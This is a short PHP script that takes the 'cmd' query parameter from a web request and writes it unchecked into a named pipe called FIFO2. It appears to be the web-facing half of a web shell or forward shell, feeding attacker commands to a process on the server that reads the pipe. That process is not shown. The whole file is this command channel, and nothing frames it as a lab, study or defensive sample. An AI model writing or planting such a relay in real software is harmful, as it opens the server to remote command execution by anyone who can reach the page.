<?php

  $pipe = fopen("FIFO2","w");
  fwrite($pipe, $_GET["cmd"]);
  fclose($pipe);

?>
